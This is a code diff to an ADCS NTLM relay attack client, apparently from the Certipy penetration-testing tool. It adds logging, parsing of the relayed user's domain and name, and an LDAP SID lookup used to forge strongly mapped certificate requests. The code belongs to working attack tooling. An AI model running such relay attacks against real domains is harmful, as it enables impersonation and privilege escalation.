@@ -421,6 +421,26 @@ class ADCSHTTPAttackClient(ProtocolAttack):
         super().__init__(*args, **kwargs)
         self.adcs_relay = adcs_relay
 
+        # Parse domain and username from the relayed client
+        username = self.client.user
+        logging.info(f"Initializing HTTP attack client for relayed user {username!r}")
+
+        try:
+            if "\\" in username:
+                self.domain, self.username = username.split("\\")
+            elif "/" in username:
+                self.domain, self.username = username.split("/")
+            else:
+                self.domain, self.username = "Unknown", username
+
+            logging.info(
+                f"Parsed relayed user: domain={self.domain!r}, username={self.username!r}"
+            )
+        except Exception as e:
+            logging.error(f"Error parsing username {username}: {e}")
+            handle_error()
+            self.domain, self.username = "Unknown", username
+
     def run(self) -> None:  # type: ignore
         """
         Execute the certificate request attack with proper locking.
@@ -527,6 +547,8 @@ class ADCSHTTPAttackClient(ProtocolAttack):
         """
         Request a new certificate for the relayed user.
         """
+        logging.info(f"Starting certificate request for {self.username!r}")
+
         # Choose appropriate template based on username
         template = self.config.template
         if template is None:
@@ -537,6 +559,7 @@ class ADCSHTTPAttackClient(ProtocolAttack):
             alt_sid = self.adcs_relay.get_sid_for_user(self.username)
 
         # Generate certificate signing request
+        logging.info(f"Generating CSR for {self.username!r} with SID {alt_sid!r}")
         csr, key = create_csr(
             self.username,
             alt_dns=self.adcs_relay.alt_dns,
@@ -816,7 +839,7 @@ class Relay:
         smime: Optional[str] = None,
         archive_key: Optional[str] = None,
         pfx_password: Optional[str] = None,
-        retrieve: Optional[int] = None,
+        retrieve: Optional[str] = None,
         key_size: int = 2048,
         out: Optional[str] = None,
         interface: str = "0.0.0.0",
@@ -828,6 +851,7 @@ class Relay:
         auto_sid: bool = False,
         **kwargs,  # type: ignore
     ):
+        logging.info("Certipy Relay with Strong Mapping support initialized")
         """
         Initialize the NTLM relay attack.
 
@@ -1053,16 +1077,22 @@ class Relay:
             Object SID as string, or None if lookup fails
         """
         if not self.kwargs.get("username"):
-            logging.debug(
-                "No LDAP credentials provided, cannot fetch SID automatically"
+            logging.warning(
+                "No LDAP credentials provided, cannot fetch SID automatically. "
+                "Provide -u and -p to enable automatic SID fetching."
             )
             return None
 
+        logging.info(f"Attempting to fetch SID for {username!r} from LDAP")
+
         try:
-            target = Target(
-                DnsResolver.create(),
-                **self.kwargs,
-            )
+            from certipy.lib.target import Target as TargetClass
+
+            # Convert kwargs back to Namespace for Target.from_options
+            options = argparse.Namespace(**self.kwargs)
+
+            # Create target object using Certipy's standard logic
+            target = TargetClass.from_options(options, dc_as_target=True)
 
             connection = LDAPConnection(target)
             connection.connect()
@@ -1071,11 +1101,15 @@ class Relay:
             if user:
                 sid = user.get("objectSid")
                 if sid:
-                    logging.info(f"Automatically fetched SID for {username!r}: {sid}")
+                    logging.info(f"Successfully fetched SID for {username!r}: {sid}")
                     return sid
+                else:
+                    logging.warning(f"Could not find objectSid for user {username!r}")
+            else:
+                logging.warning(f"Could not find user {username!r} in LDAP")
 
         except Exception as e:
-            logging.debug(f"Failed to fetch SID for {username!r}: {e}")
+            logging.error(f"Failed to fetch SID for {username!r}: {e}")
 
         return None
 
